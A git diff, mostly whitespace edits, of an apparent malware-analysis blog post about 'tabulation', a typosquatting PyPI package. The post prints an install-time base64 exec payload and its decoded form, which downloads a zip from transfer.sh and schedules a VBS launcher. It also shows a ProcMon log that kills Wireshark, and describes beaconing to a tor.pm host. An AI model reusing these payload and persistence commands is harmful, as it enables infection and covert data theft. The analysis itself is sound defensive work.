@@ -10,11 +10,11 @@ summary: "Looking deeper into PyArmor obfuscated malware utilizing tools such as
 
 Before I begin, a gentle shoutout to Lockness Ko, our dynamic analysis specialist, for his assistance with the dynamic analysis portion of this particular malicious package.
 
-On the 26th of June, a Python package named **tabulation** came across our malware feed. It displayed all the signs of being a malicious package-- executing a base64 string within the setup.py portion of the package, and squatting a fairly well known package, **tabulate** by utilizing it's README and Github pages in the metadata. As we do with all packages that are suspected to be malicious, we began an analysis. 
+On the 26th of June, a Python package named **tabulation** came across our malware feed. It displayed all the signs of being a malicious package-- executing a base64 string within the setup.py portion of the package, and squatting a fairly well known package, **tabulate** by utilizing it's README and Github pages in the metadata. As we do with all packages that are suspected to be malicious, we began an analysis.
 
 ## The Payload
 
-As mentioned, the payload contained a base64 encoded string that would execute upon the installation of the package. Nothing shockingly out of the ordinary or ground breaking here on the malware front, this is a common tactic, it's easy to detect, and this particular version was easy enough to reverse as well. 
+As mentioned, the payload contained a base64 encoded string that would execute upon the installation of the package. Nothing shockingly out of the ordinary or ground breaking here on the malware front, this is a common tactic, it's easy to detect, and this particular version was easy enough to reverse as well.
 
 ```python
 exec(base64.b64decode("aW1wb3J0IHN1YnByb2Nlc3MsIG9zCmRlZiByKGMpOiA\
@@ -39,7 +39,7 @@ CAgICAgcjIoZidzY2h0YXNrcyAvQ3JlYXRlIC9TQyBPTkNFIC9TVCB7dH0gL1ROICJ\
 VcGRhdGVyIiAvVFIgIkM6XFByb2dyYW1EYXRhXEluc3RhbGxcaW52aXMudmJzIicp"))
 ```
 
-So let's unpack this a bit. As with most of these, you can simply swap the `exec` for a `print` and out will pop the 'obfuscated' payload. 
+So let's unpack this a bit. As with most of these, you can simply swap the `exec` for a `print` and out will pop the 'obfuscated' payload.
 
 ```python
 import subprocess, os
@@ -55,7 +55,7 @@ if os.name == "nt":
         r2(f'schtasks /Create /SC ONCE /ST {t} /TN "Updater" /TR "C:\ProgramData\Install\invis.vbs"')
 ```
 
-Now this is a little more exciting. As we can see, we use Powershell's `Invoke-WebRequest` to quietly curl down an **install.zip** file from transfer.sh and to unpack it into a known location. It then invokes the Windows Task Scheduler to execute **invis.vbs** a minute after the subprocess is executed. Presumably, this is to allow for the file to download and decompress. But what exactly do these files contain, and what is invis.vbs doing? 
+Now this is a little more exciting. As we can see, we use Powershell's `Invoke-WebRequest` to quietly curl down an **install.zip** file from transfer.sh and to unpack it into a known location. It then invokes the Windows Task Scheduler to execute **invis.vbs** a minute after the subprocess is executed. Presumably, this is to allow for the file to download and decompress. But what exactly do these files contain, and what is invis.vbs doing?
 
 ```vb
 Set oShell = CreateObject ("Wscript.Shell") 
@@ -68,8 +68,9 @@ This creates a WScript Shell, which invokes **inst.pyw**. We're now at Russian n
 
 ## Dynamic Analysis
 
-So with our static unpackers struggling to work through the PyArmor obfuscation, we shifted to dynamic analysis. I mentioned Lockness Ko earlier in the article; he was kind enough to lend a Dynamic Analysis sandbox for the next portion. We began as most dynamic analysis solutions do-- spinning up PCAP and packet sniffing software, turning on ProcMon and running the program. The first time we managed to get the program to run in the sandbox, Wireshark immediately died. A good indicator that we're dealing with something that's attempting to enumerate the virtual machine. We moved network monitoring out of the sandbox and tried again... 
-And not much happened. We killed the process and pulled up ProcMon to see if there was something we were missing, but we weren't catching a whole lot. So in the spirit of seeing if this was some sort of delayed execution, we went ahead and ran the file one more time and let it sit for what felt like an eternity. And we waited. And we waited. And at last, we had something. ProcMon started firing off system events for enumeration of the current environment: 
+So with our static unpackers struggling to work through the PyArmor obfuscation, we shifted to dynamic analysis. I mentioned Lockness Ko earlier in the article; he was kind enough to lend a Dynamic Analysis sandbox for the next portion. We began as most dynamic analysis solutions do-- spinning up PCAP and packet sniffing software, turning on ProcMon and running the program. The first time we managed to get the program to run in the sandbox, Wireshark immediately died. A good indicator that we're dealing with something that's attempting to enumerate the virtual machine. We moved network monitoring out of the sandbox and tried again...
+And not much happened. We killed the process and pulled up ProcMon to see if there was something we were missing, but we weren't catching a whole lot. So in the spirit of seeing if this was some sort of delayed execution, we went ahead and ran the file one more time and let it sit for what felt like an eternity. And we waited. And we waited. And at last, we had something. ProcMon started firing off system events for enumeration of the current environment:
+
 ```plaintext
 "10:09:44.5260407 PM","WScript.exe","3396","Process Create","C:\Windows\System32\cmd.exe","SUCCESS","PID: 4292, Command line: ""C:\Windows\System32\cmd.exe"" /c pythonw C:\ProgramData\Install\inst.pyw"
 "10:09:45.6561948 PM","pythonw.exe","5020","Process Create","C:\Program Files\Python311\Scripts\pip.exe","SUCCESS","PID: 1188, Command line: pip install requests"
@@ -81,14 +82,15 @@ And not much happened. We killed the process and pulled up ProcMon to see if the
 "10:10:08.5120777 PM","pythonw.exe","5020","Process Create","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","SUCCESS","PID: 1052, Command line: powershell.exe get-process | format-table mainwindowtitle"
 ```
 
-Now I'd like to draw some attention to several lines here. 
-`taskkill /f /im wireshark.exe` - The source of our dead Wireshark on the first run. 
-`pip install requests` and `pip install cryptography` will be very important very soon. 
+Now I'd like to draw some attention to several lines here.
+`taskkill /f /im wireshark.exe` - The source of our dead Wireshark on the first run.
+`pip install requests` and `pip install cryptography` will be very important very soon.
 We can see the outbound beaconing in Wireshark, given that we've moved Wireshark outside of the virtual machine. We can see it calling to a **tor.pm** address in our PCAP's. Since we're not catching the events in process monitor, this must mean that ~~the call is coming from inside the house~~ the requests are being transmitted through Python. But what is this actually doing, what information is being communicated?
 
 Well as previously mentioned, we saw **requests** and **cryptography** installed through subprocesses. So that gives us some good intuition about the kind of interface we might be dealing with for this information. Intuition dictated that hooking the **requests** POST API function might spill out the information we're looking for. So we did just that.
 
 **requests/api.py**
+
 ```python
 def post(url, data=None, json=None, **kwargs):
     with open("C:\Windows\Temp\post.txt", "a") as f:
@@ -96,7 +98,8 @@ def post(url, data=None, json=None, **kwargs):
     ...
 ```
 
-Running this, as anticipated, caused any POSTs utilizing the Python Requests package to write themselves to a file. We went ahead and ran the script again and... 
+Running this, as anticipated, caused any POSTs utilizing the Python Requests package to write themselves to a file. We went ahead and ran the script again and...
+
 ```plaintext
 REQUEST
 xxxx://xxxx.tor.pm/
@@ -104,7 +107,7 @@ xxxx://xxxx.tor.pm/
 ...}
 ```
 
-And that's not shockingly helpful. However, we do have some excellent pretext for what this information might actually be! If you recall earlier, the **cryptography** package was installed during the execution of the malware. Fernet is a very common cryptography format used in Python, and more importantly, the `gAAAAAB`refers to a fairly fixed portion, the "fixed" timestamp. This allowed us to confirm that these were indeed Fernet encrypted payloads. For those unfamiliar with Fernet, it is a symmetric encryption algorithm utilizing a key. For our purposes, that is the brief of it. For those looking to read more, you can find a writeup on Fernet encryption in the [PYCA Cryptography documents](https://cryptography.io/en/latest/fernet/). Equipped with that information, we went ahead and enumerated the Cryptography package as well. Utilizing the same techniques we used in the requests modification, we hooked the `generate_key()` and `encrypt()` functions to also write their arguments to a file. So, for one final, time, we went ahead and ran the program, with all the appropriate functions hooked. And it worked perfectly! 
+And that's not shockingly helpful. However, we do have some excellent pretext for what this information might actually be! If you recall earlier, the **cryptography** package was installed during the execution of the malware. Fernet is a very common cryptography format used in Python, and more importantly, the `gAAAAAB`refers to a fairly fixed portion, the "fixed" timestamp. This allowed us to confirm that these were indeed Fernet encrypted payloads. For those unfamiliar with Fernet, it is a symmetric encryption algorithm utilizing a key. For our purposes, that is the brief of it. For those looking to read more, you can find a writeup on Fernet encryption in the [PYCA Cryptography documents](https://cryptography.io/en/latest/fernet/). Equipped with that information, we went ahead and enumerated the Cryptography package as well. Utilizing the same techniques we used in the requests modification, we hooked the `generate_key()` and `encrypt()` functions to also write their arguments to a file. So, for one final, time, we went ahead and ran the program, with all the appropriate functions hooked. And it worked perfectly!
 
 ```plaintext
 ========
